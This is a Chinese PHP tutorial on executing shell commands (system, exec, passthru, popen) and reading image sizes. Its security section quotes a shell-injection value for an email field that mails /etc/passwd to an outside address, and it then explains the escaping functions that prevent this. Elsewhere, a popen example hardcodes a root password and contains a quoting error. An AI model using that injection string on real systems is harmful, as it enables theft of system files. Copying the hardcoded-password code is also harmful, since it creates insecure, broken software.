# [PHP高级语法总结][0]

2月15日发布 

[TOC]

> php高级语法总结。

## 一、执行系统外部命令

1. system() 输出并返回最后一行shell结果。
1. exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
1. passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。

相同点：都可以获得命令执行的状态码

### 1）用PHP提供的专门函数

PHP提供共了3个专门的执行外部命令的函数：system()，exec()，passthru()。 

**system()**  
原型：string system (string command [, int return_var])  
system()函数很其它语言中的差不多，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。   
例子：   

```php
<?php 
system("/usr/local/bin/webalizer/webalizer"); 
```

**exec()**  
原型：string exec (string command [, string array [, int return_var]])  
exec ()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。虽然它只返回命令结果的最后一行，但用第二个参数array 可以得到完整的结果，方法是把结果逐行追加到array的结尾处。所以**如果array不是空的，在调用之前最好用unset()最它清掉**。只有指定了第二 个参数时，才可以用第三个参数，用来取得命令执行的状态码。

```php
<?php 
exec("/bin/ls -l"); 
exec("/bin/ls -l", $res); 
exec("/bin/ls -l", $res, $rc); 
```

我们可以exec()这个方法获取服务器端的IP

    // 注意：ipconfig是Windows下的查看命令，而Linux为ifconfig命令
    exec('ifconfig -a', $arr);
    print_r($arr);

**passthru()**  
原型：void passthru (string command [, int return_var])  
passthru ()只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上。所以passthru()函数经常用来调用象pbmplus （Unix下的一个处理图片的工具，输出二进制的原始图片的流）这样的程序。同样它也可以得到命令执行的状态码。   
例子：   

```php
<?php 
header("Content-type: image/gif"); 
passthru("./ppmtogif hunte.ppm"); 
```

### 2） 用popen()函数打开进程

上面的方法只能简单地执行命令，却不能与命令交互。但有些时候必须向命令输入一些东西，如在增加Linux的系统用户时，要调用su来把当前用户换到root才行，而su命令必须要在命令行上输入root的密码。这种情况下，用上面提到的方法显然是不行的。 

popen ()函数打开一个进程管道来执行给定的命令，返回一个文件句柄。既然返回的是一个文件句柄，那么就可以对它读和写了。在PHP3中，对这种句柄只能做单一 的操作模式，要么写，要么读；从PHP4开始，可以同时读和写了。除非这个句柄是以一种模式（读或写）打开的，否则必须调用pclose()函数来关闭 它。   
例子1：   

```php
<?php 
$fp=popen("/bin/ls -l", "r"); 
```

示例2：

```php
<?php 
/* PHP中如何增加一个系统用户 
下面是一段例程，增加一个名字为james的用户, 
root密码是 verygood。仅供参考 
*/ 
$sucommand = "su --login root --command"; 
$useradd = "useradd "; 
$rootpasswd = "verygood"; 
$user = "james"; 
$user_add = sprintf("%s "%s %s"",$sucommand,$useradd,$user); 
$fp = @popen($user_add,"w"); 
@fputs($fp,$rootpasswd); 
@pclose($fp); 
```

### 3）系统命令实际项目中应用示例
```php
//查找到php安装位置
$phpcmd = exec("which php");
print_r($phpcmd);
// 输出结果  /usr/bin/php   

$arr = array();
$ret = exec("/bin/ls -l", $arr); 
print_r($ret);
print_r($arr);
```

### 4)使用外部命令需要注意的安全性

比如，你有一家小型的网上商店，所以可以出售的产品列表放在一个文件中。你编写了一个有表单的HTML文件，让你的用户输入他们的EMAIL地 址，然后把这个产品列表发给他们。假设你没有使用PHP的mail()函数（或者从未听说过），你就调用Linux/Unix系统的mail程序来发送这 个文件。程序就象这样：   

```php
<?php 
system("mail $to < products.txt"); 
echo "我们的产品目录已经发送到你的信箱：$to"; 
```

用这段代码，一般的用户不会产生什么危险，但实际上存在着非常大的安全漏洞。如果有个恶意的用户输入了这样一个EMAIL地址：

    '--bla ; mail someone@domain.com < /etc/passwd ;' 

那么这条命令最终变成：

    'mail --bla ; mail someone@domain.com < /etc/passwd ; < products.txt' 

我相信，无论哪个网络管理人员见到这样的命令，都会吓出一身冷汗来。   
幸 好，PHP为我们提供了两个函数：EscapeShellCmd()和EscapeShellArg()。函数EscapeShellCmd把一个字符串 中所有可能瞒过Shell而去执行另外一个命令的字符转义。这些字符在Shell中是有特殊含义的，象分号（），重定向（>）和从文件读入 （<）等。函数EscapeShellArg是用来处理命令的参数的。它在给定的字符串两边加上单引号，并把字符串中的单引号转义，这样这个字符串 就可以安全地作为命令的参数。   
再来看看超时问题。如果要执行的命令要花费很长的时间，那么应该把这个命令放到系统的后台去运 行。但在默认情况下，象system()等函数要等到这个命令运行完才返回（实际上是要等命令的输出结果），这肯定会引起PHP脚本的超时。解决的办法是 把命令的输出重定向到另外一个文件或流中，如：   

```php
<?php 
system("/usr/local/bin/order_proc > /tmp/null &"); 
```

### 5)、高级命令实际项目中应用：

[自己实现异步执行任务的队列（二）][11]

    do_queue.php部分代码：
    
    $phpcmd = exec("which php");    //查找到php安装位置
    $cqueue = new Queue();
    $tasks = $cqueue->getQueueTask(200);
    foreach ($tasks as $t)
    {
        $taskphp = $t['taskphp'];
        $param = $t['param'];
        $job = $phpcmd . " " . escapeshellarg($taskphp) . " " . escapeshellarg($param);
        system($job);
    }

## 二、图片处理

### 1) 取得图像大小

array getimagesize ( string $filename [, array &$imageinfo ] )  
getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。

如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。

[getimagesize()][12]官方文档说明。

示例，获取图片大小：

    $url = "http://img2.fengniao.com/product/157/367/ce0Ar9cBeSl2A.jpg";
    $ret = getimagesize($url);
    var_dump($ret);

打印结果：

    Array
    (
        [0] => 2100
        [1] => 1280
        [2] => 2
        [3] => width="2100" height="1280"
        [bits] => 8
        [channels] => 3
        [mime] => image/jpeg
    )

```php
<?php
$size = getimagesize($filename);
$fp=fopen($filename, "rb");
if ($size && $fp) {
  header("Content-type: {$size['mime']}");
  fpassthru($fp);
  exit;
} else {
  // error
}
```

相关文章：  
[PHP 执行系统外部命令 system() exec() passthru()][13]  
[PHP中exec与system用法区别][14]

[0]: https://segmentfault.com/a/1190000008352884
[11]: https://segmentfault.com/a/1190000000525775
[12]: http://php.net/manual/zh/function.getimagesize.php
[13]: http://www.jb51.net/article/19618.htm
[14]: http://www.jb51.net/article/55455.htm